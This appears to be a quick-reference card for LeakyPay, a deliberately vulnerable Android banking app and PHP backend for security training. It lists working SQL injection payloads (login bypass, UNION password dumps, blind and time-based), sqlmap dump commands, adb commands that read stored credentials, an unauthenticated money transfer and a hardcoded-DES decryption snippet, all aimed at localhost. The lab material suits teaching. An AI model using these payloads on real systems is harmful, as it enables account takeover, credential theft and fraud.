# LeakyPay Quick Reference Card

Fast reference for common commands and exploits for LeakyPay.

## Start Services

```bash
# Backend
cd web && php -S localhost:80

# Check backend
curl http://localhost/api/login.php?username=test&password=test

# Android (build & install)
cd android && ./gradlew installDebug

# Launch app
adb shell am start -n com.vulnerable.app/.MainActivity
```

## Test Credentials

| User    | Password    | Balance |
|---------|-------------|---------|
| test    | test        | $1,000  |
| alice   | password123 | $5,000  |
| bob     | qwerty      | $3,000  |
| admin   | admin       | $10,000 |

## Quick Exploits

### M1: Exported Activity
```bash
adb shell am start -a com.vulnerable.app.SECRET_ACTION
```

### M2: View Stored Credentials
```bash
adb shell cat /data/data/com.vulnerable.app/shared_prefs/user_prefs.xml
adb logcat | grep password
```

### M3: Intercept HTTP Traffic
```bash
# Setup Burp Suite on port 8080
# Configure Android proxy to your computer's IP:8080
# Browse app traffic in Burp
```

### M4: SQL Injection - Login Bypass
```bash
curl "http://localhost/api/login.php?username=admin'%20OR%20'1'='1&password=x"
```

### M4: SQL Injection - Dump Passwords
```bash
curl "http://localhost/api/login.php?username=admin'%20UNION%20SELECT%20NULL,username,password,NULL,NULL,NULL,NULL%20FROM%20users--&password=x"
```

### M4: Access Any Balance
```bash
curl "http://localhost/api/balance.php?username=alice"
curl "http://localhost/api/balance.php?username=admin"
```

### M4: Steal Money
```bash
curl -X POST http://localhost/api/transfer.php \
  -H "Content-Type: application/json" \
  -d '{"from":"alice","to":"test","amount":5000}'
```

### M5: Decrypt Data
```kotlin
// In Kotlin REPL or test:
val key = "12345678" // Hardcoded key
val cipher = Cipher.getInstance("DES/ECB/PKCS5Padding")
cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(key.toByteArray(), "DES"))
// Decrypt any encrypted data from the app
```

## ADB Commands

```bash
# List devices
adb devices

# Install app
adb install app-debug.apk

# Uninstall app
adb uninstall com.vulnerable.app

# Clear app data
adb shell pm clear com.vulnerable.app

# View logs
adb logcat

# Filter logs
adb logcat | grep -E "(MainActivity|ApiClient)"

# Shell into device
adb shell

# Pull file from device
adb pull /data/data/com.vulnerable.app/shared_prefs/user_prefs.xml

# Screen record
adb shell screenrecord /sdcard/demo.mp4

# Take screenshot
adb shell screencap /sdcard/screen.png
adb pull /sdcard/screen.png
```

## Database Commands

```bash
# Connect to MySQL
mysql -u root -p

# Use database
USE vulnerable_bank;

# View users
SELECT * FROM users;

# View transactions
SELECT * FROM transactions;

# Manual SQL injection test
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'x';

# Reset database
SOURCE database.sql;
```

## Burp Suite Setup

```bash
# 1. Start Burp Suite
# 2. Proxy → Options → Proxy Listeners → 8080
# 3. Export CA certificate

# 4. Android proxy settings:
adb shell settings put global http_proxy YOUR_IP:8080

# 5. Install Burp CA cert on Android:
# Settings → Security → Install from storage

# 6. Disable proxy:
adb shell settings put global http_proxy :0
```

## SQL Injection Payloads

### Authentication Bypass
```
username=admin' OR '1'='1'--&password=anything
username=admin' OR 1=1--&password=x
username=' OR '1'='1&password=' OR '1'='1
```

### Data Extraction
```
# Dump all users
username=x' UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL FROM users--&password=x

# Get database version
username=x' UNION SELECT @@version,NULL,NULL,NULL,NULL,NULL,NULL--&password=x

# List tables
username=x' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--&password=x

# Count users
username=x' UNION SELECT COUNT(*),NULL,NULL,NULL,NULL,NULL,NULL FROM users--&password=x
```

### Boolean Blind SQLi
```
# Check if admin exists
username=admin' AND '1'='1&password=x  # Success
username=admin' AND '1'='2&password=x  # Fail

# Extract password length
username=admin' AND LENGTH(password)=5--&password=x
```

### Time-Based Blind SQLi
```
username=admin' AND SLEEP(5)--&password=x
```

## Common Build Issues

```bash
# Clean Gradle
cd android
./gradlew clean

# Invalidate caches
# In Android Studio: File → Invalidate Caches / Restart

# Update Gradle wrapper
./gradlew wrapper --gradle-version=8.1

# Sync project
./gradlew build --refresh-dependencies

# View Gradle logs
./gradlew installDebug --stacktrace
```

## Backend Debugging

```bash
# Enable PHP errors
php -d display_errors=On -S localhost:80

# View PHP error log
tail -f /var/log/php_errors.log

# Test MySQL connection
mysql -u root -p -e "USE vulnerable_bank; SELECT COUNT(*) FROM users;"

# Check PHP modules
php -m | grep mysqli

# Restart services
# XAMPP: Restart from control panel
# Linux: sudo systemctl restart mysql
```

## Network Testing

```bash
# Find your local IP
# Windows:
ipconfig

# macOS/Linux:
ifconfig

# Test backend from Android device
# On device browser, visit: http://YOUR_IP/api/login.php?username=test&password=test

# Test with curl
curl -v http://localhost/api/login.php?username=test&password=test

# Check if port is open
netstat -an | grep 80

# Allow through firewall (Windows)
netsh advfirewall firewall add rule name="PHP Server" dir=in action=allow protocol=TCP localport=80
```

## Useful Android Logs

```bash
# Only errors
adb logcat *:E

# Specific tag
adb logcat -s VulnerableApp

# Multiple tags
adb logcat MainActivity:D ApiClient:D *:S

# Save to file
adb logcat > app_logs.txt

# Clear logs
adb logcat -c

# Time stamps
adb logcat -v time
```

## SQLMap (Automated SQLi)

```bash
# Install
pip install sqlmap

# Test login endpoint
sqlmap -u "http://localhost/api/login.php?username=test&password=test" --dbs

# Dump database
sqlmap -u "http://localhost/api/login.php?username=test&password=test" -D vulnerable_bank --dump

# Dump specific table
sqlmap -u "http://localhost/api/login.php?username=test&password=test" -D vulnerable_bank -T users --dump
```

## Files to Modify

| What to Change | File | Line |
|----------------|------|------|
| Backend URL | ApiClient.kt | 15 |
| Backend Port | ApiClient.kt | 16 |
| SDK Path | local.properties | 7 |
| App ID | app/build.gradle | 10 |
| DB Credentials | config.php | 3-6 |

## Documentation Files

- `README.md` - Project overview
- `SETUP.md` - Installation guide
- `VULNERABILITIES.md` - Complete vuln list
- `CLAUDE.md` - Developer guide
- `android/README.md` - Android details
- `web/README.md` - Backend details

## Security Tools

- **Burp Suite**: https://portswigger.net/burp
- **mitmproxy**: https://mitmproxy.org/
- **SQLMap**: https://sqlmap.org/
- **MobSF**: https://github.com/MobSF/Mobile-Security-Framework-MobSF
- **Frida**: https://frida.re/

---

**Remember**: This is for educational purposes only. Never test on systems you don't own!
